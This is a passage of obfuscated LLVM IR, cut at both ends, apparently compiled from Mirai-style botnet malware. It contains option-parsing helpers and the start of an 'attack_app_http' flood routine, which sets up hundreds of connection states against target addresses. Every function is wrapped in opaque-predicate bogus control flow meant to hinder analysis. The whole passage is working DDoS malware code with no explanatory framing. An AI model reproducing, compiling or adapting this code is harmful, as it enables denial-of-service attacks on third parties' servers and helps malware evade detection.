  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %10, align 4
  %21 = load i8, i8* %6, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp slt i32 %20, %22
  %24 = load i32, i32* @x.13
  %25 = load i32, i32* @y.14
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %54

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %34 = load i32, i32* %10, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i64 %35
  %37 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %36, i32 0, i32 1
  %38 = load i8, i8* %37, align 8
  %39 = zext i8 %38 to i32
  %40 = load i8, i8* %8, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %50

; <label>:43:                                     ; preds = %32
  %44 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %45 = load i32, i32* %10, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %44, i64 %46
  %48 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %47, i32 0, i32 0
  %49 = load i8*, i8** %48, align 8
  store i8* %49, i8** %5, align 8
  br label %56

; <label>:50:                                     ; preds = %32
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = load i32, i32* %10, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %10, align 4
  br label %11

; <label>:54:                                     ; preds = %originalBBpart2
  %55 = load i8*, i8** %9, align 8
  store i8* %55, i8** %5, align 8
  br label %56

; <label>:56:                                     ; preds = %54, %43
  %57 = load i8*, i8** %5, align 8
  ret i8* %57

originalBBalteredBB:                              ; preds = %originalBB, %11
  %58 = load i32, i32* %10, align 4
  %59 = load i8, i8* %6, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %58, %60
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %35

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* @x.15
  %19 = load i32, i32* @y.16
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* %9, align 4
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* @x.15
  %28 = load i32, i32* @y.16
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:35:                                     ; preds = %4
  %36 = load i8*, i8** %10, align 8
  %37 = call i32 @util_atoi(i8* %36, i32 10)
  store i32 %37, i32* %5, align 4
  br label %38

; <label>:38:                                     ; preds = %35, %originalBBpart2
  %39 = load i32, i32* %5, align 4
  ret i32 %39

originalBBalteredBB:                              ; preds = %originalBB, %17
  %40 = load i32, i32* %9, align 4
  store i32 %40, i32* %5, align 4
  br label %originalBB
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = load i32, i32* @x.17
  %6 = load i32, i32* @y.18
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8, align 1
  %15 = alloca %struct.attack_option*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  store i8 %0, i8* %14, align 1
  store %struct.attack_option* %1, %struct.attack_option** %15, align 8
  store i8 %2, i8* %16, align 1
  store i32 %3, i32* %17, align 4
  %19 = load i8, i8* %14, align 1
  %20 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %21 = load i8, i8* %16, align 1
  %22 = call i8* @attack_get_opt_str(i8 zeroext %19, %struct.attack_option* %20, i8 zeroext %21, i8* null)
  store i8* %22, i8** %18, align 8
  %23 = load i8*, i8** %18, align 8
  %24 = icmp eq i8* %23, null
  %25 = load i32, i32* @x.17
  %26 = load i32, i32* @y.18
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %35

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* %17, align 4
  store i32 %34, i32* %13, align 4
  br label %38

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i8*, i8** %18, align 8
  %37 = call i32 @inet_addr(i8* %36) #6
  store i32 %37, i32* %13, align 4
  br label %38

; <label>:38:                                     ; preds = %35, %33
  %39 = load i32, i32* @x.17
  %40 = load i32, i32* @y.18
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* %13, align 4
  %48 = load i32, i32* @x.17
  %49 = load i32, i32* @y.18
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %4
  %56 = alloca i32, align 4
  %57 = alloca i8, align 1
  %58 = alloca %struct.attack_option*, align 8
  %59 = alloca i8, align 1
  %60 = alloca i32, align 4
  %61 = alloca i8*, align 8
  store i8 %0, i8* %57, align 1
  store %struct.attack_option* %1, %struct.attack_option** %58, align 8
  store i8 %2, i8* %59, align 1
  store i32 %3, i32* %60, align 4
  %62 = load i8, i8* %57, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %58, align 8
  %64 = load i8, i8* %59, align 1
  %65 = call i8* @attack_get_opt_str(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext %64, i8* null)
  store i8* %65, i8** %61, align 8
  %66 = load i8*, i8** %61, align 8
  %67 = icmp eq i8* %66, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %68 = load i32, i32* %13, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.19
  %6 = load i32, i32* @y.20
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.attack_http_state*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i16, align 2
  %28 = alloca [10241 x i8], align 16
  %29 = alloca %struct.fd_set, align 8
  %30 = alloca %struct.fd_set, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca %struct.timeval, align 8
  %34 = alloca %struct.attack_http_state*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %struct.sockaddr_in, align 4
  %41 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %42 = alloca [10240 x i8], align 16
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i32, align 4
  %47 = alloca i32, align 4
  %48 = alloca i8*, align 8
  %49 = alloca i32, align 4
  %50 = alloca i32, align 4
  %51 = alloca i8*, align 8
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i8*, align 8
  %63 = alloca i32, align 4
  %64 = alloca i32, align 4
  %65 = alloca i8*, align 8
  %66 = alloca i32, align 4
  %67 = alloca i32, align 4
  %68 = alloca i32, align 4
  %69 = alloca i32, align 4
  %70 = alloca i32, align 4
  %71 = alloca i32, align 4
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  store i32 0, i32* %20, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %21, align 8
  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = call i8* @attack_get_opt_str(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 21, i8* null)
  store i8* %74, i8** %22, align 8
  %75 = load i8, i8* %15, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %77 = call i8* @attack_get_opt_str(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %77, i8** %23, align 8
  %78 = load i8, i8* %15, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %80 = call i8* @attack_get_opt_str(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 8, i8* null)
  store i8* %80, i8** %24, align 8
  %81 = load i8, i8* %15, align 1
  %82 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %83 = call i8* @attack_get_opt_str(i8 zeroext %81, %struct.attack_option* %82, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %83, i8** %25, align 8
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 24, i32 1)
  store i32 %86, i32* %26, align 4
  %87 = load i8, i8* %15, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 7, i32 80)
  %90 = trunc i32 %89 to i16
  store i16 %90, i16* %27, align 2
  %91 = bitcast [10241 x i8]* %28 to i8*
  call void @llvm.memset.p0i8.i64(i8* %91, i8 0, i64 10241, i32 16, i1 false)
  %92 = load i8*, i8** %24, align 8
  %93 = icmp eq i8* %92, null
  %94 = load i32, i32* @x.19
  %95 = load i32, i32* @y.20
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %93, label %105, label %102

; <label>:102:                                    ; preds = %originalBBpart2
  %103 = load i8*, i8** %25, align 8
  %104 = icmp eq i8* %103, null
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %102, %originalBBpart2
  br label %4295

; <label>:106:                                    ; preds = %102
  %107 = load i8*, i8** %25, align 8
  %108 = call i32 @util_strlen(i8* %107)
  %109 = icmp sgt i32 %108, 255
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %106
  br label %4295

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %24, align 8
  %113 = call i32 @util_strlen(i8* %112)
  %114 = icmp sgt i32 %113, 127
  br i1 %114, label %115, label %132

; <label>:115:                                    ; preds = %111
  %116 = load i32, i32* @x.19
  %117 = load i32, i32* @y.20
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %115
  %124 = load i32, i32* @x.19
  %125 = load i32, i32* @y.20
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %4295

; <label>:132:                                    ; preds = %111
  %133 = load i8*, i8** %23, align 8
  %134 = call i32 @util_strlen(i8* %133)
  %135 = icmp sgt i32 %134, 9
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %132
  br label %4295

; <label>:137:                                    ; preds = %132
  store i32 0, i32* %18, align 4
  br label %138

; <label>:138:                                    ; preds = %originalBBpart222, %137
  %139 = load i32, i32* %18, align 4
  %140 = load i8*, i8** %23, align 8
  %141 = call i32 @util_strlen(i8* %140)
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %220

; <label>:143:                                    ; preds = %138
  %144 = load i32, i32* @x.19
  %145 = load i32, i32* @y.20
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %143
  %152 = load i8*, i8** %23, align 8
  %153 = load i32, i32* %18, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %158 = icmp sge i32 %157, 97
  %159 = load i32, i32* @x.19
  %160 = load i32, i32* @y.20
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %158, label %167, label %184

; <label>:167:                                    ; preds = %originalBBpart28
  %168 = load i8*, i8** %23, align 8
  %169 = load i32, i32* %18, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %168, i64 %170
  %172 = load i8, i8* %171, align 1
  %173 = sext i8 %172 to i32
  %174 = icmp sle i32 %173, 122
  br i1 %174, label %175, label %184

; <label>:175:                                    ; preds = %167
  %176 = load i8*, i8** %23, align 8
  %177 = load i32, i32* %18, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8, i8* %176, i64 %178
  %180 = load i8, i8* %179, align 1
  %181 = sext i8 %180 to i32
  %182 = sub nsw i32 %181, 32
  %183 = trunc i32 %182 to i8
  store i8 %183, i8* %179, align 1
  br label %184

; <label>:184:                                    ; preds = %175, %167, %originalBBpart28
  %185 = load i32, i32* @x.19
  %186 = load i32, i32* @y.20
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %184
  %193 = load i32, i32* @x.19
  %194 = load i32, i32* @y.20
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %201

; <label>:201:                                    ; preds = %originalBBpart212
  %202 = load i32, i32* @x.19
  %203 = load i32, i32* @y.20
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %201
  %210 = load i32, i32* %18, align 4
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %18, align 4
  %212 = load i32, i32* @x.19
  %213 = load i32, i32* @y.20
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart222, label %originalBB14alteredBB

originalBBpart222:                                ; preds = %originalBB14
  br label %138

; <label>:220:                                    ; preds = %138
  %221 = load i32, i32* %26, align 4
  %222 = icmp sgt i32 %221, 500
  br i1 %222, label %223, label %224

; <label>:223:                                    ; preds = %220
  store i32 500, i32* %26, align 4
  br label %224

; <label>:224:                                    ; preds = %223, %220
  call void @table_unlock_val(i8 zeroext 36)
  call void @table_unlock_val(i8 zeroext 37)
  call void @table_unlock_val(i8 zeroext 38)
  call void @table_unlock_val(i8 zeroext 39)
  call void @table_unlock_val(i8 zeroext 40)
  call void @table_unlock_val(i8 zeroext 41)
  call void @table_unlock_val(i8 zeroext 42)
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  %225 = load i32, i32* %26, align 4
  %226 = sext i32 %225 to i64
  %227 = call noalias i8* @calloc(i64 %226, i64 3140) #6
  %228 = bitcast i8* %227 to %struct.attack_http_state*
  store %struct.attack_http_state* %228, %struct.attack_http_state** %21, align 8
  store i32 0, i32* %17, align 4
  br label %229

; <label>:229:                                    ; preds = %originalBBpart252, %224
  %230 = load i32, i32* %17, align 4
  %231 = load i32, i32* %26, align 4
  %232 = icmp slt i32 %230, %231
  br i1 %232, label %233, label %599

; <label>:233:                                    ; preds = %229
  %234 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %235 = load i32, i32* %17, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %234, i64 %236
  %238 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %237, i32 0, i32 1
  store i8 0, i8* %238, align 4
  %239 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %240 = load i32, i32* %17, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %239, i64 %241
  %243 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %242, i32 0, i32 0
  store i32 -1, i32* %243, align 4
  %244 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %245 = load i32, i32* %17, align 4
  %246 = load i8, i8* %13, align 1
  %247 = zext i8 %246 to i32
  %248 = srem i32 %245, %247
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %244, i64 %249
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %250, i32 0, i32 1
  %252 = load i32, i32* %251, align 4
  %253 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %254 = load i32, i32* %17, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %253, i64 %255
  %257 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %256, i32 0, i32 4
  store i32 %252, i32* %257, align 4
  %258 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %259 = load i32, i32* %17, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %258, i64 %260
  %262 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %261, i32 0, i32 6
  %263 = getelementptr inbounds [257 x i8], [257 x i8]* %262, i32 0, i32 0
  %264 = load i8*, i8** %25, align 8
  %265 = call i32 @util_strcpy(i8* %263, i8* %264)
  %266 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %267 = load i32, i32* %17, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %266, i64 %268
  %270 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %269, i32 0, i32 6
  %271 = getelementptr inbounds [257 x i8], [257 x i8]* %270, i64 0, i64 0
  %272 = load i8, i8* %271, align 4
  %273 = sext i8 %272 to i32
  %274 = icmp ne i32 %273, 47
  br i1 %274, label %275, label %319

; <label>:275:                                    ; preds = %233
  %276 = load i32, i32* @x.19
  %277 = load i32, i32* @y.20
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %275
  %284 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %285 = load i32, i32* %17, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %287, i32 0, i32 6
  %289 = getelementptr inbounds [257 x i8], [257 x i8]* %288, i32 0, i32 0
  %290 = getelementptr inbounds i8, i8* %289, i64 1
  %291 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %292 = load i32, i32* %17, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %291, i64 %293
  %295 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %294, i32 0, i32 6
  %296 = getelementptr inbounds [257 x i8], [257 x i8]* %295, i32 0, i32 0
  %297 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %298 = load i32, i32* %17, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %297, i64 %299
  %301 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %300, i32 0, i32 6
  %302 = getelementptr inbounds [257 x i8], [257 x i8]* %301, i32 0, i32 0
  %303 = call i32 @util_strlen(i8* %302)
  %304 = sext i32 %303 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %290, i8* %296, i64 %304, i32 1, i1 false)
  %305 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %306 = load i32, i32* %17, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %305, i64 %307
  %309 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %308, i32 0, i32 6
  %310 = getelementptr inbounds [257 x i8], [257 x i8]* %309, i64 0, i64 0
  store i8 47, i8* %310, align 4
  %311 = load i32, i32* @x.19
  %312 = load i32, i32* @y.20
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %319

; <label>:319:                                    ; preds = %originalBBpart227, %233
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %321 = load i32, i32* %17, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 10
  %325 = getelementptr inbounds [9 x i8], [9 x i8]* %324, i32 0, i32 0
  %326 = load i8*, i8** %23, align 8
  %327 = call i32 @util_strcpy(i8* %325, i8* %326)
  %328 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %329 = load i32, i32* %17, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %328, i64 %330
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %331, i32 0, i32 9
  %333 = getelementptr inbounds [9 x i8], [9 x i8]* %332, i32 0, i32 0
  %334 = load i8*, i8** %23, align 8
  %335 = call i32 @util_strcpy(i8* %333, i8* %334)
  %336 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %337 = load i32, i32* %17, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %336, i64 %338
  %340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %339, i32 0, i32 7
  %341 = getelementptr inbounds [129 x i8], [129 x i8]* %340, i32 0, i32 0
  %342 = load i8*, i8** %24, align 8
  %343 = call i32 @util_strcpy(i8* %341, i8* %342)
  %344 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %345 = load i32, i32* %17, align 4
  %346 = load i8, i8* %13, align 1
  %347 = zext i8 %346 to i32
  %348 = srem i32 %345, %347
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %344, i64 %349
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i32 0, i32 2
  %352 = load i8, i8* %351, align 4
  %353 = zext i8 %352 to i32
  %354 = icmp slt i32 %353, 32
  br i1 %354, label %355, label %385

; <label>:355:                                    ; preds = %319
  %356 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %357 = load i32, i32* %17, align 4
  %358 = load i8, i8* %13, align 1
  %359 = zext i8 %358 to i32
  %360 = srem i32 %357, %359
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i64 %361
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i32 0, i32 1
  %364 = load i32, i32* %363, align 4
  %365 = call i32 @ntohl(i32 %364) #7
  %366 = call i32 @rand_next()
  %367 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %368 = load i32, i32* %17, align 4
  %369 = load i8, i8* %13, align 1
  %370 = zext i8 %369 to i32
  %371 = srem i32 %368, %370
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i64 %372
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i32 0, i32 2
  %375 = load i8, i8* %374, align 4
  %376 = zext i8 %375 to i32
  %377 = lshr i32 %366, %376
  %378 = add i32 %365, %377
  %379 = call i32 @htonl(i32 %378) #7
  %380 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %381 = load i32, i32* %17, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %380, i64 %382
  %384 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %383, i32 0, i32 4
  store i32 %379, i32* %384, align 4
  br label %385

; <label>:385:                                    ; preds = %355, %319
  %386 = load i32, i32* @x.19
  %387 = load i32, i32* @y.20
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
